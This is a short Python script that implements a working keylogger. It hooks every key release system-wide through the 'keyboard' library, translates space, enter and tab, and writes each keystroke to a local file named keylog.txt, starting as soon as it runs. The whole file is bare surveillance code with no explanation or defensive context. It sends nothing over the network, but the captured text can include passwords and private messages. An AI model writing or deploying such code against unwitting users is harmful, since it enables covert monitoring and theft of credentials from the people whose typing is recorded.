import os

import keyboard

class Keylogger:
    def __init__(self, log_filename):
        self.f = open(log_filename,"w")

    def start_log(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()

    def callback(self, event):
        button = event.name
        if button == "space":
            button = " "
        if button == "enter":
            button = "\n"
        if button == "tab":
            button = "    "
        self.f.write(button)
        self.f.flush()

os.chdir(os.path.dirname(os.path.abspath(__file__)))
keylogger_object = Keylogger("keylog.txt")
keylogger_object.start_log()
